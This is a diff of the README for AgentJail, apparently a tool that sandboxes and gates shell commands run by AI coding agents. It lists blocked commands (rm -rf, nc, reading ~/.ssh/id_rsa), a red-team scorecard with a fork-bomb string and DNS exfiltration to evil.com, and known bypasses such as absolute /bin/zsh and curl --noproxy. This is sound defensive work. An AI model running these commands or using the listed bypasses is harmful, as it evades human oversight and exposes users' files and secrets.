@@ -1,127 +1,246 @@
+<div align="center">
+
 # AgentJail
 
-Local zero-latency **holographic shadow workspace** and kernel-tracing firewall
-for AI coding agents — COW clones, Docker PID/cap isolation, CONNECT egress
-whitelist, live streaming, and MCP memory sync.
+**A containment runtime for AI coding agents.**
 
-## Requirements
+Your agent proposes. AgentJail inspects, sandboxes, and asks — before anything touches your machine.
 
-- Python 3.11+
-- Docker Desktop or Docker Engine (daemon running)
-- Host `git` (for hologram Time Machine checkpoints)
-- Ability to build `agentjail-sandbox:local` (includes `strace`)
+[![License: MIT](https://img.shields.io/badge/License-MIT-black.svg)](LICENSE)
+[![Python](https://img.shields.io/badge/python-3.11%2B-black.svg)](pyproject.toml)
+[![Tests](https://img.shields.io/badge/tests-64%20passing-black.svg)](tests/)
+[![MCP](https://img.shields.io/badge/MCP-Cursor%20%7C%20Claude%20%7C%20Windsurf-black.svg)](#mcp-gateway)
 
-## 10-second setup
+[Quickstart](#quickstart) · [How it works](#how-it-works) · [Invisible mode](#invisible-mode) · [Security model](#security-model) · [Contributing](CONTRIBUTING.md)
+
+</div>
+
+---
+
+> **Demo**
+>
+> _Video walkthrough coming soon._
+
+---
+
+## The problem
+
+Coding agents run shell commands. Most of the time that is `pytest` and `npm install`. Occasionally it is `rm -rf`, a rewritten `.env`, or a package that phones home.
+
+You find out afterward.
+
+## What AgentJail does
+
+Every command is classified before it executes, runs against a copy-on-write clone of your workspace inside an ephemeral container, and only reaches your real files when you say so.
+
+| | Without AgentJail | With AgentJail |
+|---|---|---|
+| `pytest` | Runs on your machine | Runs in a disposable sandbox |
+| `npm install left-pad` | Installs, unbounded network | Sandboxed, whitelist egress only |
+| `echo secret > .env` | Overwrites your file | Waits for your approval |
+| `rm -rf build` | Gone | Blocked before it starts |
+| Agent "forgets" you rejected it | Keeps going | `SYSTEM OVERRIDE` re-syncs its memory |
+
+---
+
+## Quickstart
+
+**Requirements:** Python 3.11+, Docker running, host `git`.
 
 ```bash
-pip install agentjail          # or from a checkout: pip install -e .
-agentjail setup                # build agentjail-sandbox:local (once)
-agentjail init                 # patch Claude / Cursor / Windsurf MCP configs
-agentjail start                # control panel → http://127.0.0.1:8420
+git clone https://github.com/ADITYALONE/AgentVigilante.git && cd AgentVigilante
+python3 -m venv .venv && source .venv/bin/activate
+pip install -e .
+
+agentjail setup     # build the sandbox image (once)
+agentjail init      # wire up Cursor / Claude / Windsurf MCP
+agentjail start     # console → http://127.0.0.1:8420
 ```
 
-Optional:
+Restart your IDE after `init` so the MCP server loads.
+
+Try it:
 
 ```bash
-agentjail init --project       # also patch ./.cursor/mcp.json
-npx agentjail-cli init         # Node wrapper (requires pip-installed agentjail)
+curl -s http://127.0.0.1:8420/v1/commands \
+  -H 'Content-Type: application/json' \
+  -d '{"command":"echo hello > greeting.txt","timeout":10}'
 ```
 
-Restart Cursor / Claude after `init` so the MCP server appears.
+That is a RISKY write. It appears in the console — and as a native dialog — waiting for **Approve** or **Deny**.
 
-## Hard interception: `agentjail wrap` (PATH shims)
+---
 
-MCP + prompt rules are **soft** — the model can still use a built-in Shell tool.
-For OS-level interception, wrap the agent/IDE so PATH lookups for `bash`, `zsh`,
-`npm`, `python`, etc. hit shims under `~/.agentjail/shims` and forward into the
-daemon:
+## How it works
 
-```bash
-agentjail start                 # terminal A — control panel + native dialogs
-agentjail shim-install          # once (also auto-run by wrap)
-agentjail wrap claude           # CLI agents
-agentjail wrap cursor .         # launches Cursor Mach-O with shimmed PATH (macOS)
+```mermaid
+flowchart TD
+  agent[Agent command]
+  analyzer[AST risk analyzer]
+  blocked[Blocked with feedback]
+  pending[Pending your approval]
+  hologram[COW shadow workspace]
+  docker["Docker sandbox + strace"]
+  egress[Whitelist CONNECT proxy]
+  promote[Promote to real workspace]
+
+  agent --> analyzer
+  analyzer -->|CRITICAL| blocked
+  analyzer -->|RISKY| pending
+  analyzer -->|SAFE| hologram
+  pending -->|Approve| hologram
+  hologram --> docker
+  docker --> egress
+  docker --> promote
 ```
 
-| | Soft (MCP rule) | Hard (`agentjail wrap`) |
-|--|-----------------|-------------------------|
-| Setup | `init` + prompt rule | `wrap <agent>` |
-| Intercepts | Only if the model calls `agentjail_exec` | PATH lookups for shimmed binaries |
-| Built-in Shell | No | Yes, when the shell is found via `PATH` |
-| Absolute `/bin/zsh` | N/A | **Bypasses shims** (documented residual) |
+1. **Classify** — a `bashlex` AST pass sorts every command into SAFE, RISKY, or CRITICAL.
+2. **Clone** — the job gets a copy-on-write shadow of your workspace. Docker mounts the shadow, never the origin.
+3. **Contain** — non-root container, CPU/memory caps, `pids_limit=64`, `cap_drop=ALL`, destroyed after the turn.
+4. **Filter** — outbound traffic passes a whitelist CONNECT proxy; DNS inside the sandbox is blackholed.
+5. **Decide** — approve, deny with feedback, promote the diff, or revert the hologram and the agent's memory with it.
 
-Mitigations shipped with wrap: prepend shim dir to `PATH`, set `SHELL` to the
-shimmed shell, launch GUI apps by their binary (not `open -a`, which drops env).
-Set `AGENTJAIL_BYPASS=1` only for intentional host passthrough.
+---
 
-When a RISKY job is queued, AgentJail shows a **native Approve / Deny** dialog
-(macOS `osascript`, Linux `zenity`/`kdialog` when available) in addition to the
-web console. Disable with `agentjail start --no-native-notify`.
+## Three ways to route agents through the jail
 
-## Invisible mode (opt-in background)
+| | MCP gateway | `agentjail wrap` | Invisible mode |
+|---|---|---|---|
+| Setup | `agentjail init` | `agentjail wrap cursor .` | `agentjail invisible enable` |
+| Intercepts | Tool calls the model chooses | PATH lookups for `bash`, `npm`, `python`, … | Same, globally, every terminal |
+| Built-in IDE Shell | No | Yes | Yes |
+| Runs in background | No | No | launchd / systemd |
+| Interrupts you | Every RISKY | Every RISKY | Anomalies only |
 
-Default remains **interactive** (front): manual `start`, dashboard/dialogs, HITL
-for all RISKY. Enable Invisible only if you want security to run in the
-background:
+### MCP gateway
 
 ```bash
-agentjail invisible enable     # service + ~/.zshrc PATH + autopilot
+agentjail init              # patches Claude / Cursor / Windsurf
+agentjail init --project    # also ./.cursor/mcp.json
+```
+
+Tools exposed: `agentjail_exec`, `agentjail_job_status`, `agentjail_revert`.
+
+<details>
+<summary>Manual MCP config</summary>
+
+```json
+{
+  "mcpServers": {
+    "agentjail": {
+      "command": "python",
+      "args": ["-m", "agent_jail.mcp_server"],
+      "env": { "AGENTJAIL_URL": "http://127.0.0.1:8420" }
+    }
+  }
+}
+```
+
+</details>
+
+### PATH shims (`agentjail wrap`)
+
+MCP is a *soft* boundary — the model can still reach for a built-in Shell tool. Wrapping is harder: shims in `~/.agentjail/shims` intercept the binary lookup itself.
+
+```bash
+agentjail shim-install
+agentjail wrap claude       # CLI agents
+agentjail wrap cursor .     # launches Cursor with shimmed PATH (macOS)
+```
+
+`wrap` prepends the shim directory to `PATH`, points `SHELL` at the shimmed shell, and launches GUI apps by their binary so the environment survives. Set `AGENTJAIL_BYPASS=1` for deliberate host passthrough.
+
+> **Residual risk:** an absolute invocation such as `/bin/zsh -c ...` skips PATH entirely and is not intercepted.
+
+---
+
+## Invisible mode
+
+Interactive is the default. Invisible mode is for when you want the guard running without the ceremony.
+
+```bash
+agentjail invisible enable     # background service + shell PATH + autopilot
 agentjail invisible status
-agentjail invisible disable    # back to interactive front mode
+agentjail invisible disable    # back to interactive
 ```
 
 | | Interactive (default) | Invisible |
-|--|----------------------|-----------|
-| Daemon | `agentjail start` | launchd / systemd via `service install` |
-| PATH | optional `wrap` | injected into `.zshrc` / `.bashrc` |
-| `npm install` / `pytest` | pending Approve | **silent** autopilot in hologram |
-| `.env` / `.ssh` writes | pending | pending + IDE Approve/Block |
-| `rm -rf` / CRITICAL | blocked | blocked + IDE toast |
-| UX | browser / osascript | status bar extension |
+|---|---|---|
+| Daemon | `agentjail start` | launchd / systemd |
+| PATH | opt-in via `wrap` | injected into `.zshrc` / `.bashrc` |
+| `npm install`, `pytest` | waits for approval | silent autopilot in the hologram |
+| `.env` / `.ssh` writes | waits | waits, prompts in your IDE |
+| `rm -rf`, fork bombs | blocked | blocked, toast in your IDE |
+| Where you approve | browser / native dialog | IDE status bar |
 
-Service only:
+**Autopilot** is what keeps it quiet: standard development commands run straight through the sandbox, and you are only interrupted by anomalies — sensitive-path writes, global installs, `git push`, destructive patterns.
 
-```bash
-agentjail service install|uninstall|status|start|stop
-```
-
-IDE extension: [`extensions/vscode/`](extensions/vscode/) — status bar
-`AgentJail: Active (N pending)` and 1-click Approve/Block. Install from that
-folder (see its README). Absolute `/bin/zsh` still bypasses PATH shims.
-
-### Dev checkout (legacy)
+Service control on its own:
 
 ```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-chmod +x scripts/setup.sh
-agentjail setup
-cd web && npm install && npm run build && cd ..
-agentjail init --project
-agentjail start
+agentjail service install | uninstall | status | start | stop
 ```
 
-`python run.py` still works (same as `agentjail start --no-browser` flags via `start_main`).
+### IDE extension
 
-## Dashboard (shadcn + mosaic front)
+[`extensions/vscode/`](extensions/vscode/) adds a status bar item — `AgentJail: Active (0 pending)` — with one-click **Approve** / **Block** when something needs you. Install instructions live in that folder.
 
-The UI lives in [`web/`](web/) as a Vite + React + shadcn app. Landing at `/`,
-containment console at `/console`.
+---
+
+## Security model
+
+### Risk routing
+
+| Risk | Examples | Behavior |
+|------|----------|----------|
+| **SAFE** | `ls`, `pwd`, `cat`, `git status` | Auto-runs in the sandbox |
+| **RISKY** | `npm install`, `pip install`, `echo x > file`, `python script.py`, `ln` | Waits for approval (autopilot may auto-run the routine ones) |
+| **CRITICAL** | `rm -rf`, `curl`, `dig`, `nc`, fork bombs, `cat ~/.ssh/id_rsa` | Blocked immediately |
+
+### Defense in depth
+
+1. **Pre-flight AST analyzer** (`bashlex`) — classification before execution
+2. **Human in the loop** — approve, deny with feedback, or deny and revert
+3. **Docker isolation** — non-root `1000:1000`, memory/CPU caps, `pids_limit=64`, `cap_drop=ALL` (+ `SYS_PTRACE` for tracing), `no-new-privileges`, ephemeral
+4. **Whitelist CONNECT egress** — allowed hosts only, no TLS interception
+5. **DNS blackhole** — `dns=127.0.0.1` inside the container; registry hosts pinned via `extra_hosts`
+6. **Symlink guard** — SAFE commands touching workspace symlinks escalate to review and are rechecked at approve time
+7. **Git Time Machine** — checkpoints under `refs/agentjail/*` inside the hologram
+8. **Memory revert** — wiping the shadow also injects a one-shot `SYSTEM OVERRIDE` so the model stops believing its change landed
+
+### Egress whitelist
+
+`pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `github.com`, `objects.githubusercontent.com`, `nodejs.org` and their subdomains.
+
+Containers get `HTTP(S)_PROXY=http://host.docker.internal:8888`. Clients that honor the proxy are filtered at CONNECT.
+
+> **Residual risk:** raw TCP to literal IPs, and tools that ignore `HTTP_PROXY` (`curl --noproxy '*'`), can still leave via the Docker bridge until an iptables sidecar lands. Treat **Approve** as a privileged action.
+
+<details>
+<summary>Red-team scorecard</summary>
+
+| Scenario | Verdict | Notes |
+|----------|---------|-------|
+| **Natural-language disguise** — `python exploit.py` wrapping `curl` | AST sees only `python` → RISKY (human review). Proxy-aware HTTPS to non-whitelist hosts is blocked after approve. | Nested payloads are not AST-visible; blackholed DNS and CRITICAL `curl` reduce impact. |
+| **Fork bomb** — `:(){ :\|:& };:` | Inline pattern → CRITICAL. Script-borne variants hit `pids_limit=64` and the `nproc` ulimit. | PID exhaustion is contained at the cgroup. |
+| **DNS exfiltration** — `dig <hex>.evil.com` | `dig` / `nslookup` / `host` → CRITICAL; resolver blackholed. | A public resolver would not help — query labels still leak. Residual: raw UDP/TCP to attacker IPs. |
+| **TOCTOU symlink escape** | Bind mounts do not traverse symlinks to the host FS; workspace symlinks escalate SAFE → RISKY and are blocked at approve. | Shared read-write races remain a concurrency concern, not a host escape. |
+
+</details>
+
+---
+
+## Console
+
+The UI is a Vite + React + shadcn app in [`web/`](web/): landing at `/`, containment console at `/console`.
+
+Approve or deny pending commands, stream live terminal output over WebSocket, inspect filesystem diffs, review kernel telemetry from `strace -f`, promote a hologram into your real workspace, or hit E-Stop.
 
 ```bash
 cd web
 npm install
-npm run build   # outputs web/dist — served by FastAPI
-# optional live reload:
-npm run dev     # http://127.0.0.1:5173 (proxies /v1 and /health)
-```
-
-Then start the API/runtime:
-
-```bash
-agentjail start
-# or: python run.py
+npm run build      # outputs web/dist, served by FastAPI
+npm run dev        # optional live reload on :5173
 ```
 
 | Flag | Default |
@@ -131,67 +250,14 @@ agentjail start
 | `--workdir` | `./workspace` |
 | `--base-image` | `agentjail-sandbox:local` |
 | `--proxy-port` | `8888` |
+| `--no-native-notify` | off |
 
-Dashboard: [http://127.0.0.1:8420/](http://127.0.0.1:8420/) · Console: [/console](http://127.0.0.1:8420/console)
+---
 
-## Operator polish
+## API
 
-1. **Holographic workspaces** — Each job COW-clones `--workdir` into `.agentjail_shadow/<job>/` (APFS `cp -c` / Linux reflink, copy fallback). Docker mounts the **shadow**, never the origin. Use **Promote to workspace** to land diffs; otherwise the real tree is untouched.
-2. **Deny feedback** — Deny opens a modal. **Deny & Revert** wipes the hologram and arms a `SYSTEM OVERRIDE` for the next MCP tool result so the model’s memory matches the filesystem.
-3. **Time Machine** — Git checkpoint inside the hologram before exec; Diff tab can restore the shadow snapshot.
-4. **Kernel Telemetry** — `strace -f` event log (`openat` / `connect` / `clone` / …) plus call-count bars in the console **Kernel** tab.
-5. **MCP** — `agentjail_exec`, `agentjail_job_status`, `agentjail_revert(job_id, reason)`.
-6. **PATH wrap** — `agentjail wrap` prepends `~/.agentjail/shims` so agent Shell calls hit the jail.
-7. **Native dialogs** — RISKY pending jobs can be Approve/Deny'd without leaving the IDE.
-
-## Defense-in-depth
-
-1. **Pre-flight AST analyzer** (`bashlex`) — SAFE auto-exec, RISKY queue for approval, CRITICAL auto-block
-2. **Human-in-the-loop** — dashboard approve/deny for RISKY commands
-3. **Docker sandbox** — non-root (`1000:1000`), mem/CPU caps, **`pids_limit=64`**, `cap_drop=ALL` + `cap_add=SYS_PTRACE`, `no-new-privileges`, ephemeral containers, optional `strace -c` wrap
-4. **Whitelist CONNECT egress proxy** — `pip`/`npm` can reach allowed hosts only (no TLS MITM)
-5. **DNS blackhole** — container `dns=127.0.0.1`; whitelist package hosts pinned via `extra_hosts`
-6. **Workspace symlink guard** — SAFE commands that touch workdir symlinks escalate to HITL; Approve re-checks and blocks
-7. **Git Time Machine** — host-side checkpoints under `refs/agentjail/*` inside the hologram (DiffEngine still skips `.git` / `.agentjail_shadow`)
-8. **Memory revert** — Deny & Revert / `agentjail_revert` wipe the shadow and inject a one-shot SYSTEM OVERRIDE into MCP tool results
-
-### Risk routing
-
-| Risk | Examples | Behavior |
-|------|----------|----------|
-| SAFE | `ls`, `pwd`, `cat README.md`, `git status` | Auto-run in sandbox |
-| RISKY | `npm install`, `echo x > file`, `pip install`, `python exploit.py`, `ln` | Pending until approved |
-| CRITICAL | `rm -rf`, `curl`, `dig`, `nc`/`socat`, fork-bomb, `cat ~/.ssh/id_rsa` | Blocked immediately |
-
-### Egress whitelist (default)
-
-`pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `github.com`,
-`objects.githubusercontent.com`, `nodejs.org` (plus subdomains).
-
-Containers receive `HTTP(S)_PROXY=http://host.docker.internal:8888`. Clients that
-honor the proxy are filtered via CONNECT. Recursive DNS inside the sandbox is
-disabled; registry hostnames are pinned on the host before start.
-
-**Residual risk:** raw TCP to literal IPs (and tools that ignore `HTTP_PROXY`,
-e.g. `curl --noproxy '*'`) can still leave on the Docker bridge until a
-network-policy / iptables sidecar is added. Treat Approve as privileged.
-
-### CIBER / red-team scenario scorecard
-
-| Scenario | Verdict | Mitigation |
-|----------|---------|------------|
-| **S1 Natural-language disguise** (`python exploit.py` with nested `curl`) | AST sees only `python` → **RISKY** (HITL). Proxy-aware HTTPS to non-whitelist hosts is **blocked** after Approve. | Nested payloads are not AST-visible; egress is env-honor CONNECT, not forced. Blackhole DNS + critical `curl` reduce impact. |
-| **S2 Fork bomb** (`:(){ :\|:& };:`) | Inline pattern → **CRITICAL**. Script-borne bombs hit **`pids_limit=64`** + `nproc` ulimit. | Host freeze from PID exhaustion is contained at the container cgroup. |
-| **S3 DNS exfiltration** (`dig <hex>.evil.com`) | `dig`/`nslookup`/`host` → **CRITICAL**. Resolver path blackholed (`dns=127.0.0.1`). | Setting `dns=8.8.8.8` would **not** stop exfil (query labels still leak). Residual: raw UDP/TCP to attacker IPs. |
-| **S4 TOCTOU symlink to host** | Docker bind-mount does **not** allow symlink traversal onto the host FS. Workdir symlinks escalate SAFE→RISKY and are blocked at Approve. | Shared rw workspace races remain a concurrency concern, not a host-root escape. |
-
-Run regression checks:
-
-```bash
-PYTHONPATH=. python -m unittest discover -s tests -v
-```
-
-## API quickstart
+<details>
+<summary>HTTP endpoints</summary>
 
 ```bash
 # SAFE — auto-executes
@@ -199,111 +265,102 @@ curl -s http://127.0.0.1:8420/v1/commands \
   -H 'Content-Type: application/json' \
   -d '{"command":"ls -la","timeout":10}'
 
-# CRITICAL — blocked
-curl -s http://127.0.0.1:8420/v1/commands \
-  -H 'Content-Type: application/json' \
-  -d '{"command":"rm -rf /workspace/build"}'
-
 # RISKY — pending approval
 curl -s http://127.0.0.1:8420/v1/commands \
   -H 'Content-Type: application/json' \
   -d '{"command":"echo hello > greeting.txt","timeout":10}'
 
-JOB_ID=...   # from response
 curl -s -X POST "http://127.0.0.1:8420/v1/commands/${JOB_ID}/approve"
 curl -s "http://127.0.0.1:8420/v1/commands/${JOB_ID}"
 
-# E-Stop
-curl -s -X POST http://127.0.0.1:8420/v1/estop
+# Runtime state for IDE integrations
+curl -s http://127.0.0.1:8420/v1/status
+curl -s http://127.0.0.1:8420/v1/events/recent
 
-# Egress events
+# Egress log and emergency stop
 curl -s http://127.0.0.1:8420/v1/egress/events
+curl -s -X POST http://127.0.0.1:8420/v1/estop
 ```
 
-Live terminal stream (WebSocket): `ws://127.0.0.1:8420/v1/commands/{id}/stream`
+Live output stream: `ws://127.0.0.1:8420/v1/commands/{id}/stream`
 
-## MCP gateway
+</details>
 
-Prefer auto-config:
+---
+
+## Development
 
 ```bash
-agentjail init
-# or: agentjail init --project
+git clone https://github.com/ADITYALONE/AgentVigilante.git
+cd AgentVigilante
+
+python3 -m venv .venv && source .venv/bin/activate
+pip install -e .
+agentjail setup
+cd web && npm install && npm run build && cd ..
+agentjail start
 ```
 
-Manual `.cursor/mcp.json` / Claude Desktop block (also what `init` writes):
-
-```json
-{
-  "mcpServers": {
-    "agentjail": {
-      "command": "python",
-      "args": ["-m", "agent_jail.mcp_server"],
-      "env": {
-        "AGENTJAIL_URL": "http://127.0.0.1:8420"
-      }
-    }
-  }
-}
-```
-
-Tools:
-
-- `agentjail_exec(command, timeout?)` — submit through the holographic jail; polls until terminal
-- `agentjail_job_status(job_id)` — fetch a job
-- `agentjail_revert(job_id, reason?)` — wipe hologram + arm SYSTEM OVERRIDE for memory sync
-
-With the package installed, MCP is:
+Run the suite (offline, no Docker required):
 
 ```bash
-python -m agent_jail.mcp_server
+python -m unittest discover -s tests -v
 ```
 
-## Distribution channels
-
-| Channel | Command |
-|---------|---------|
-| PyPI | `pip install agentjail` then `agentjail init` |
-| NPX wrapper | `npx agentjail-cli init` (needs Python package installed) |
-| Smithery (once published) | `npx -y @smithery/cli install agentjail --client claude` |
-
-Registry stubs live in [`smithery.yaml`](smithery.yaml) and [`npm/agentjail-cli/`](npm/agentjail-cli/).
-
-### Publish checklist (maintainers)
-
-```bash
-pip install build twine
-python -m build
-# twine upload dist/*          # PyPI — requires credentials
-# cd npm/agentjail-cli && npm publish
-```
-
-## Layout
+<details>
+<summary>Project layout</summary>
 
 ```text
 agent_jail/
-├── cli.py                   # agentjail init / start / setup
-├── __main__.py
+├── cli.py                # init / setup / start / wrap / invisible / service
+├── config.py             # ~/.agentjail/config.json
+├── shim.py               # PATH shim generation
+├── exec_shim.py          # shim → daemon client
+├── wrap.py               # environment composition and app launch
+├── service.py            # launchd / systemd units
+├── shell_integration.py  # .zshrc / .bashrc injection
+├── notify.py             # native Approve / Deny dialogs
+├── mcp_server.py         # MCP stdio server
 ├── core/
-│   ├── isolation.py
-│   ├── egress_proxy.py
-│   ├── command_analyzer.py
-│   ├── path_guard.py
-│   ├── checkpoint.py
-│   ├── hologram.py
-│   ├── strace_profile.py
+│   ├── command_analyzer.py   # AST risk classification
+│   ├── autopilot.py          # silent-run allowlist
+│   ├── hologram.py           # COW shadow workspaces
+│   ├── isolation.py          # Docker sandbox
+│   ├── egress_proxy.py       # whitelist CONNECT proxy
+│   ├── checkpoint.py         # git Time Machine
+│   ├── path_guard.py         # symlink guard
+│   ├── strace_profile.py     # kernel telemetry
 │   ├── diff_engine.py
-│   └── proxy.py
-├── dashboard/
-│   ├── server.py
-│   └── templates/
-├── mcp_server.py
-├── docker/Dockerfile.sandbox
-├── npm/agentjail-cli/       # npx wrapper
-├── scripts/setup.sh
-├── pyproject.toml
-├── smithery.yaml
-├── requirements.txt
-├── tests/
-└── run.py
+│   └── proxy.py              # FastAPI routes
+├── dashboard/server.py
+extensions/vscode/        # Cursor / VS Code status bar
+web/                      # Vite + React console
+tests/
 ```
+
+</details>
+
+---
+
+## Distribution
+
+| Channel | Command | Status |
+|---------|---------|--------|
+| Source | `pip install -e .` | available |
+| PyPI | `pip install agentjail` | pending publish |
+| npx wrapper | `npx agentjail-cli init` | pending publish |
+| Smithery | `npx -y @smithery/cli install agentjail --client claude` | pending publish |
+
+Registry stubs live in [`smithery.yaml`](smithery.yaml) and [`npm/agentjail-cli/`](npm/agentjail-cli/).
+
+---
+
+## Contributing
+
+Issues and PRs are welcome — start with [CONTRIBUTING.md](CONTRIBUTING.md). Because this is a security tool, every PR states its security impact, even when that impact is none.
+
+Found a bypass? Email **adityapunjani9@gmail.com** instead of opening a public issue.
+
+## License
+
+[MIT](LICENSE) © Aditya Punjani
